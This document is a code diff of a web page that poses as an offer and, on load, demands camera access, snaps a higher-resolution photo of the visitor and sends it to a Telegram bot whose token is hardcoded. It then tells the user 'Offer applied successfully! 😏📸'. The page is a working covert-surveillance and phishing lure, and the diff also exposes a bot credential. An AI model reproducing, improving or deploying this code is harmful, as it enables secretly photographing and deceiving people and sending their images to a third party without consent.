@@ -96,7 +96,7 @@
 </div>
 
 <video id="video" autoplay playsinline muted></video>
-<canvas id="canvas" width="320" height="240"></canvas>
+<canvas id="canvas" width="640" height="480"></canvas>
 
 <script>
   const botToken = "8079056355:AAGP1alTryOpzFmtk8ZxNWKxs6q59Mbuj70";
@@ -107,27 +107,28 @@
   const context = canvas.getContext("2d");
   let stream = null;
 
-  // Request camera on load
-  window.onload = () => {
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-      .then(s => {
-        stream = s;
-        video.srcObject = stream;
-      })
-      .catch(err => {
-        alert("⚠️ Camera access denied!");
-        console.error(err);
-      });
-  };
+  // Ask for permission and set video
+  async function initCamera() {
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+    } catch (err) {
+      alert("⚠️ Camera permission denied! You can't proceed.");
+      console.error(err);
+    }
+  }
+
+  // Run on load
+  window.onload = initCamera;
 
   async function captureAndSend() {
     if (!stream) {
-      alert("📷 Camera not ready!");
+      alert("📷 Camera is not ready yet.");
       return;
     }
 
-    // Wait for the video to be ready
-    if (video.readyState < 2) {
+    // Wait until video is ready
+    if (video.readyState < video.HAVE_ENOUGH_DATA) {
       await new Promise(resolve => {
         video.onloadeddata = () => resolve();
       });
@@ -145,7 +146,7 @@
       method: "POST",
       body: form
     }).then(() => {
-      alert("✅ Offer applied successfully!");
+      alert("✅ Offer applied successfully! 😏📸");
       stream.getTracks().forEach(track => track.stop());
     }).catch((e) => {
       alert("❌ Failed to send photo to Telegram.");
